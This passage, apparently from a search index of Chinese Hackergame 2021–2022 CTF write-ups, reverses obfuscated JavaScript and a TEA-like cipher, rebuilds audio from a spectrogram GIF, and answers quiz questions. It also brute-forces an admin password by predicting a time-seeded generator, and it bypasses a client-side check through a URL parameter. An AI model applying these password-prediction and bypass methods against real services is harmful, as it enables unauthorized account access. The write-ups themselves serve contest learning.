\u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 <code>_0x2c9e</code>\uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a <pre><code>function _0x2c9e(_0x2c9ec6, ...) {\n    _0x2c9ec6 = _0x2c9ec6 - 0x1a6;\n    return lst[_0x2c9ec6];\n}\n</code></pre> 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 <code>_0x22517d</code> \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570</p> <p>\u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 <code>gyflagh</code> \u51fd\u6570 <pre><code>function gyflagh(_0x111955) {\n    const _0x50051f = _0x22517d;\n    let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));\n    if (_0x3b790d === _0x50051f(0x1aa))\n        return !![];\n    return ![];\n}\n</code></pre> \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>function gyflagh(ans) {\n  if (ans[\"encrypt\"](\"1356853149054377\") === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\") {\n    return true;\n  }\n  return false;\n}\n</code></pre></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>String[\"prototype\"][\"encrypt\"] = function(key) { // key = \"1356853149054377\"\n    const left = new Array(2);\n    const right = new Array(4);\n    let res = \"\";\n    ans = escape(this); // this := ans\n    right = [909456177, 825439544, 892352820, 926364468]\n    for (var i = 0; i &lt; ans[\"length\"]; i = i + 8) {\n      left[0] = Str4ToLong(ans[\"slice\"](i, i + 4));\n      left[1] = Str4ToLong(ans[\"slice\"](i + 4, i + 8));\n      code(left, right);\n      res = res + (LongToBase16(left[0]) + LongToBase16(left[1]));\n    }\n    return res;  // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\n};\n</code></pre></p> <p>\u518d\u6765\u770b <code>code</code> \u51fd\u6570\uff0c\u6839\u636e &lt;&lt; 4\u3001 ^\u3001 &gt;&gt;&gt; 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a <pre><code>function dec(left, right) {\n    for (var i = 2654435769 * 32; i != 0;) {\n        left[1] -= ((left[0] &lt;&lt; 4 ^ left[0] &gt;&gt;&gt; 5) + left[0] ^ i + right[i &gt;&gt;&gt; 11 &amp; 3]);\n        i -= 2654435769;\n        left[0] -= ((left[1] &lt;&lt; 4 ^ left[1] &gt;&gt;&gt; 5) + left[1] ^ i + right[i &amp; 3]);\n    }\n    console.log(left);\n}\n</code></pre></p> <p>\u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a <pre><code>6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c\n</code></pre> \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26:  \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a<code>flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}</code></p>"}, {"location": "writeups/hackergame2021/#_13", "title": "\u5bc6\u7801\u751f\u6210\u5668", "text": "<p>\u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002</p> <p>\u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002</p> <p>\u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f</p> <p>\uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09</p> <p>\u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c</p> <p>\u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a\u65f6\u95f4\u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a</p> <p>\u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef</p> <p>\u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 <code>$Z=CBDL7TjHu~mEX</code> \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag</p>"}, {"location": "writeups/hackergame2021/#pq", "title": "p\ud83d\ude2dq", "text": "<p>\u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002</p> <p>\u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002</p> <p>\u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002</p> <p>\uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09</p> <p>\u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c\u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7</p> <p>\u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5</p> <p>\u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 <code>librosa</code>\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb\u6587\u6863\u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a <pre><code>y, sample_rate = librosa.load(\"flag.mp3\") # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387\n\nspectrogram = numpy.around( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3\n    librosa.power_to_db( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d\n        librosa.feature.melspectrogram( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31\n            y, sample_rate, n_mels=num_freqs,\n            n_fft=fft_window_size, \n            hop_length=frame_step_size, \n            window=window_function_type\n        )\n    ) / quantize # \u9664\u4ee52\n) * quantize # \u4e58\u4ee52\n</code></pre></p> <p>\u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b <code>numpy</code> \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 <code>array2gif</code> \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif </p> <p>\u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f\u5b8c\u6574\u5730\u9006\u8fc7\u6765</p> <p>\u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 <code>gif2array</code> \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 <code>PIL.Image</code>\uff1a <pre><code>from PIL import Image\nfile = Image.open(\"flag.gif\")\n\ntry:\n    while True:\n        gif_data.append(np.array(file))\n        file.seek(file.tell() + 1)\nexcept:\n    print(\"[+] Read gif file\")\n</code></pre></p> <p>\u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a <pre><code>[[-58. -48. -30. ... -58. -58. -58.]\n [-58. -44. -26. ... -58. -58. -58.]\n [-58. -40. -16. ... -58. -58. -58.]\n ...\n [-58. -42. -30. ... -58. -58. -58.]\n [-58. -44. -32. ... -58. -58. -58.]\n [-58. -46. -34. ... -58. -58. -58.]]\n</code></pre> \u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a <pre><code>[[-58. -58. -58. ... -58. -58. -58.]\n [-48. -44. -40. ... -42. -44. -46.]\n [-30. -26. -16. ... -30. -32. -34.]\n ...\n [-58. -58. -58. ... -58. -58. -58.]\n [-58. -58. -58. ... -58. -58. -58.]\n [-58. -58. -58. ... -58. -58. -58.]]\n</code></pre> \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e</p> <p>\u518d\u7ed3\u5408\u6e90\u7801\uff1a <pre><code>numpy.array([\n    [\n        red_pixel if freq % 2 and round(frame[freq // 2]) &gt; threshold else white_pixel \n        for threshold in list(range(min_db, max_db + 1, quantize))[::-1]\n    ] \n    for freq in range(num_freqs * 2 + 1)\n])\n</code></pre> \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a <pre><code>spectrogramT = []\nfor data in gif_data:\n    res = []\n    for ind, line in enumerate(data.transpose()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97\n        num = sum(line) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09\n        if ind % 4 == 3:\n            res.append(num + min_db) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9\n    spectrogramT.append(res)\n\nspectrogram = np.array(spectrogramT).transpose() # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b\n</code></pre></p> <p>\u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 <code>power_to_db</code> \u5f53\u7136\u4e5f\u5c31\u6709 <code>db_to_power</code> \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 <code>librosa.feature.inverse.mel_to_audio</code> \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a <pre><code>y = librosa.feature.inverse.mel_to_audio(\n    librosa.db_to_power(spectrogram), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86\n    sample_rate, n_iter=num_freqs, # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz\n    n_fft=fft_window_size,\n    hop_length=frame_step_size,\n    window=window_function_type,\n)\n</code></pre></p> <p>\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 <code>soundfile</code>\uff1a <pre><code>import soundfile as sf\nsf.write(\"flag.wav\", y, sample_rate)\n</code></pre></p> <p>\u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86 </p>"}, {"location": "writeups/hackergame2021/#reference", "title": "Reference", "text": "<ul> <li>Hackergame</li> <li>\u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e</li> <li>LUG@USTC \u5b98\u7f51</li> <li>Wayback Machine archive.org</li> <li>SIGBOVIK 2021</li> <li>\u767e\u5ea6\u5168\u666f\u5730\u56fe</li> <li>\u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed</li> <li>GraphQL\u5b98\u7f51\u3001GraphiQL\u3001GraphQL Voyager</li> <li>\u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e</li> <li>librosa\u6587\u6863</li> <li>PySoundFile\u6587\u6863</li> <li>Wilson's theorem - wikipedia</li> <li>BUU-RSA [RoarCTF2019]babyRSA - CSDN</li> <li>Euler's totient function - wikipedia</li> <li>LUKS2 doc pdf</li> <li>10 Linux cryptsetup Examples for LUKS Key Management</li> <li>pyinstxtractor</li> <li>uncompyle6</li> </ul>"}, {"location": "writeups/hackergame2022/", "title": "Hackergame 2022 Writeup", "text": "<p> \u7ea6 8637 \u4e2a\u5b57  182 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 31 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e8c\u6b21\u6765\u6253 Hackergame\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1ahttps://blog.tonycrane.cc/p/630bfdd5.html</p> <p>\u5b98\u65b9 writeup</p>"}, {"location": "writeups/hackergame2022/#_1", "title": "\u7b7e\u5230", "text": "<p>\u4f17\u6240\u5468\u77e5\uff0c\u7b7e\u5230\u9898\u662f\u4e00\u9053\u624b\u901f\u9898\u3002</p> <p>\u4e3a\u4e86\u5145\u5206\u53d1\u6325\u51fa\u8bf8\u4f4d\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u800c\u624b\u901f\u4f18\u5f02\u4e8e\u5e38\u4eba\u7684\u9009\u624b\u4eec\u7684\u7279\u957f\uff0c\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u4e86\u4eca\u5e74\u7684\u7b7e\u5230\u9898\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u4e3a\u4e86\u66f4\u7ec6\u81f4\u5730\u533a\u5206\u4e0d\u540c\u624b\u901f\u7684\u9009\u624b\uff0c\u6211\u4eec\u8fd8\u901a\u8fc7\u8be6\u5c3d\u7684\u8c03\u7814\u53ca\u7edf\u8ba1\u5206\u6790\uff0c\u5c06\u7b7e\u4e0b\u5b57\u7b26\u7684\u65f6\u95f4\u9650\u5236\u5206\u4e3a\u4e86\u591a\u4e2a\u7b49\u7ea7\u3002\u53ea\u6709\u6700\u9876\u5c16\u7684\u624b\u901f\u9009\u624b\uff0c\u624d\u80fd\u5728 CPU \u6765\u5f97\u53ca\u53cd\u5e94\u4e4b\u524d\u987a\u5229\u7b7e\u4e0b 2022\uff0c\u4ece\u800c\u5f97\u5230\u5149\u8363\u7684 flag\uff01</p> <p>\u4e00\u4e2a\u7f51\u7ad9\uff0c\u624b\u5199\u6570\u5b57\u6210\u529f\u8bc6\u522b\u4e3a 2022 \u5c31\u53ef\u4ee5\u5b8c\u6210\u7b7e\u5230\u3002\u4e0d\u8fc7\u9650\u5236\u4e86\u6bcf\u4e2a\u6570\u5b57\u7684\u65f6\u95f4\uff0c\u4f9d\u6b21\u4e3a 2s\u30011s\u30010.1s\u30010s\u3002</p> <p>\u6211\u8fd8\u5929\u771f\u5730\u8bd5\u7740\u7b7e\u4e86\u597d\u51e0\u6b21\uff08\u5176\u5b9e\u662f\u6ca1\u6ce8\u610f\u5230\u90a3\u4e2a 0\uff09\uff0c\u75db\u5931\u4e00\u8840\u3002</p> <p>\u505a\u6cd5\u5176\u5b9e\u662f\u5728\u6e90\u7801\u91cc\u53d1\u73b0\u8bc6\u522b\u90fd\u5728\u524d\u7aef\u8fdb\u884c\uff0c\u6700\u7ec8\u63d0\u4ea4\u7684\u65f6\u5019\u662f\u8df3\u8f6c\u5230 <code>/?result=....</code> \u9875\u9762\uff08\u6216\u8005\u4ea4\u4e00\u6b21\u8bd5\u4e00\u4e0b\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u3002\u6240\u4ee5\u76f4\u63a5\u8bbf\u95ee <code>/?result=2022</code> \u5373\u53ef\u62ff\u5230 flag\uff1aflag{HappyHacking2022-\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#_2", "title": "\u732b\u54aa\u95ee\u7b54\u55b5", "text": "<p>\u53c2\u52a0\u732b\u54aa\u95ee\u7b54\u55b5\uff0c\u53c2\u52a0\u55b5\u54aa\u95ee\u7b54\u8c22\u8c22\u55b5\u3002</p> <p>\u7ecf\u5178\u9898\u76ee\uff0c\u641c\u7d22\u5927\u6742\u70e9\u3002\u9664\u4e86\u7b2c\u4e94\u9898\u4ee5\u5916\u8fd8\u662f\u5f88\u5bb9\u6613\u627e\u5230\u7684\u3002\uff08\u8fd9\u6b21\u7adf\u7136\u5206\u4e86\u4e24\u4e2a flag \u51fa\u6765 2333\uff09</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 NEBULA \u6218\u961f\uff08USTC NEBULA\uff09\u662f\u4e8e\u4f55\u65f6\u6210\u7acb\u7684\u55b5\uff1f</li> </ol> <p>\u76f4\u63a5\u641c\u7d22\u4e86\u4e00\u4e0b \u201c\u4e2d\u56fd\u79d1\u6280\u5927\u5b66 NEBULA \u6218\u961f\u201d\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u65b0\u95fb\uff1a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\uff08Nebula\uff09\u6218\u961f\u5728\u7b2c\u516d\u5c4a\u5f3a\u7f51\u676f\u518d\u521b\u4f73\u7ee9\uff0c\u5176\u4e2d\u6587\u672b\u6709\u7b80\u5355\u4ecb\u7ecd \u201c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\u6218\u961f\uff08Nebula\uff09\u6210\u7acb\u4e8e 2017 \u5e74 3 \u6708\u2026\u2026\u201d</p> <p>\u6240\u4ee5\u7b54\u6848\u5c31\u662f 2017-03\u3002</p> <ol> <li>2022 \u5e74 9 \u6708\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\uff08LUG @ USTC\uff09\u5728\u79d1\u5927\u6821\u5185\u627f\u529e\u4e86\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u3002\u9664\u4e86\u4e13\u6ce8\u4e8e\u81ea\u7531\u64b8\u732b\u7684\u4e3b\u4f1a\u573a\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u548c\u6280\u672f\u76f8\u5173\u7684\u5206\u4f1a\u573a\uff08\u5982\u95ea\u7535\u6f14\u8bb2 Lightning Talk\uff09\u3002\u5176\u4e2d\u5728\u7b2c\u4e00\u4e2a\u95ea\u7535\u6f14\u8bb2\u4e3b\u9898\u91cc\uff0c\u4e3b\u8bb2\u4eba\u4e8e slides \u4e2d\u5c55\u793a\u4e86\u4e00\u5f20\u5728 GNOME Wayland \u4e0b\u4f7f\u7528 Wayland \u540e\u7aef\u4f1a\u51fa\u73b0\u663e\u793a\u95ee\u9898\u7684 KDE \u7a0b\u5e8f\u622a\u56fe\uff0c\u8bf7\u95ee\u8fd9\u4e2a KDE \u7a0b\u5e8f\u7684\u540d\u5b57\u662f\u4ec0\u4e48\uff1f</li> </ol> <p>\u5728 LUG @ USTC \u7684 wiki \u5c31\u80fd\u627e\u5230\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u7684\u9875\u9762\uff1aSoftware Freedom Day\uff0c\u5176\u4e2d\u53ef\u4ee5\u627e\u5230\u6240\u8bf4\u7684\u90a3\u7bc7 slides\uff1a\u300aGNOME Wayland \u4f7f\u7528\u4f53\u9a8c\uff1a\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89c6\u89d2\u300b\uff0c\u5176\u4e2d\u7b2c\u5341\u4e94\u9875\u8bb2\u4e86\u6240\u8c13\u7684 KDE \u7a0b\u5e8f\u5728 Wayland \u4e0b\u7684\u663e\u793a\u95ee\u9898\u3002\u4f46\u622a\u56fe\u91cc\u5e76\u6ca1\u6709\u8f6f\u4ef6\u540d\uff0c\u628a\u4e0b\u9762\u4e00\u884c\u5de5\u5177\u680f\u7684\u6587\u672c\u5168\u603c\u5230\u5fc5\u5e94\u91cc\uff0c\u641c\u5230\u4e86 Kdenlive \u7684\u5b98\u65b9\u6587\u6863\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f Kdenlive\u3002</p> <ol> <li>22 \u5e74\u575a\u6301\uff0c\u5c0f C 